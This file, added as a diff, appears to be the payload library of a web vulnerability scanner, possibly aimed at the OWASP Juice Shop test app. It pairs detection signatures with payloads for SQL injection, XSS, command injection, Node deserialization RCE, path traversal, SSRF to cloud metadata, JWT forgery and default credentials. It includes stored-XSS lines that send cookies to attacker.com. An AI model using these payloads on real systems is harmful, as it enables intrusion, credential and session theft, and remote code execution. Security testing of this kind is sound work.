@@ -1,0 +1,185 @@
+[
+  {
+    "name": "sqli_error_based",
+    "class": "sqli",
+    "payloads": [
+      "' OR '1'='1",
+      "' OR '1'='1'--",
+      "' OR '1'='1'/*",
+      "admin'--",
+      "1' AND 1=1--",
+      "1' AND 1=2--"
+    ],
+    "detection_signatures": ["mysql_fetch", "syntax error", "SQLite", "ORA-", "ODBC"]
+  },
+  {
+    "name": "sqli_union_based",
+    "class": "sqli",
+    "payloads": [
+      "' UNION SELECT null--",
+      "' UNION SELECT null,null--",
+      "' UNION SELECT null,null,null--",
+      "' UNION SELECT 1,2,3--",
+      "' UNION SELECT username,password FROM users--"
+    ],
+    "detection_signatures": ["UNION", "column", "number of columns"]
+  },
+  {
+    "name": "sqli_time_based",
+    "class": "sqli",
+    "payloads": [
+      "' AND SLEEP(3)--",
+      "' OR SLEEP(3)--",
+      "'; WAITFOR DELAY '0:0:3'--",
+      "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--"
+    ],
+    "detection_signatures": ["response_time > 3000ms"]
+  },
+  {
+    "name": "xss_reflected",
+    "class": "xss",
+    "payloads": [
+      "<script>alert(1)</script>",
+      "<img src=x onerror=alert(1)>",
+      "<svg/onload=alert(1)>",
+      "'\"><script>alert(document.domain)</script>",
+      "<body onload=alert(1)>",
+      "javascript:alert(1)"
+    ],
+    "detection_signatures": ["payload reflected in response without encoding"]
+  },
+  {
+    "name": "xss_stored",
+    "class": "xss",
+    "payloads": [
+      "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
+      "<img src=x onerror=fetch('http://attacker.com/'+document.cookie)>"
+    ],
+    "detection_signatures": ["payload persists across requests"]
+  },
+  {
+    "name": "xss_dom",
+    "class": "xss",
+    "payloads": [
+      "#<img src=x onerror=alert(1)>",
+      "javascript:alert(document.domain)//",
+      "'-alert(1)-'"
+    ],
+    "detection_signatures": ["payload in DOM without server reflection"]
+  },
+  {
+    "name": "idor_numeric",
+    "class": "idor",
+    "payloads": ["1", "2", "3", "0", "-1", "9999", "999999"],
+    "detection_signatures": ["different user data returned", "no 403/401"]
+  },
+  {
+    "name": "idor_uuid",
+    "class": "idor",
+    "payloads": [
+      "00000000-0000-0000-0000-000000000001",
+      "00000000-0000-0000-0000-000000000002"
+    ],
+    "detection_signatures": ["data returned for other user UUID"]
+  },
+  {
+    "name": "broken_auth_default_creds",
+    "class": "broken_auth",
+    "payloads": [
+      "admin:admin",
+      "admin:admin123",
+      "admin:password",
+      "test:test",
+      "admin@juice-sh.op:admin123"
+    ],
+    "detection_signatures": ["token in response", "200 status", "session cookie set"]
+  },
+  {
+    "name": "broken_auth_jwt_none",
+    "class": "broken_auth",
+    "payloads": [
+      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0."
+    ],
+    "detection_signatures": ["admin access granted", "no signature validation"]
+  },
+  {
+    "name": "broken_auth_sqli_bypass",
+    "class": "broken_auth",
+    "payloads": [
+      "' OR 1=1--",
+      "admin'--",
+      "' OR '1'='1'--"
+    ],
+    "detection_signatures": ["authentication bypassed", "token returned"]
+  },
+  {
+    "name": "info_disclosure_debug",
+    "class": "info_disclosure",
+    "payloads": [
+      "/.env",
+      "/debug",
+      "/api/debug",
+      "/swagger.json",
+      "/api-docs",
+      "/.git/config",
+      "/server-status",
+      "/phpinfo.php"
+    ],
+    "detection_signatures": ["sensitive data in response", "stack traces", "credentials"]
+  },
+  {
+    "name": "info_disclosure_error",
+    "class": "info_disclosure",
+    "payloads": [
+      "/%00",
+      "/undefined",
+      "/null",
+      "/?id=",
+      "/api/undefined"
+    ],
+    "detection_signatures": ["stack trace", "internal paths", "database details"]
+  },
+  {
+    "name": "command_injection_basic",
+    "class": "command_injection",
+    "payloads": [
+      "; ls",
+      "| cat /etc/passwd",
+      "$(whoami)",
+      "`id`",
+      "; ping -c 3 127.0.0.1"
+    ],
+    "detection_signatures": ["command output in response", "response time indicates execution"]
+  },
+  {
+    "name": "deserialization_node",
+    "class": "unsafe_deserialization",
+    "payloads": [
+      "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}",
+      "{\"__proto__\":{\"toString\":\"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}\"}}  "
+    ],
+    "detection_signatures": ["command execution", "serialization error with code execution"]
+  },
+  {
+    "name": "path_traversal",
+    "class": "info_disclosure",
+    "payloads": [
+      "../../../etc/passwd",
+      "....//....//....//etc/passwd",
+      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "/etc/passwd%00.jpg"
+    ],
+    "detection_signatures": ["file content returned", "root:x:0:0"]
+  },
+  {
+    "name": "ssrf_basic",
+    "class": "info_disclosure",
+    "payloads": [
+      "http://127.0.0.1:80",
+      "http://localhost:22",
+      "http://169.254.169.254/latest/meta-data/",
+      "file:///etc/passwd"
+    ],
+    "detection_signatures": ["internal service response", "cloud metadata"]
+  }
+]
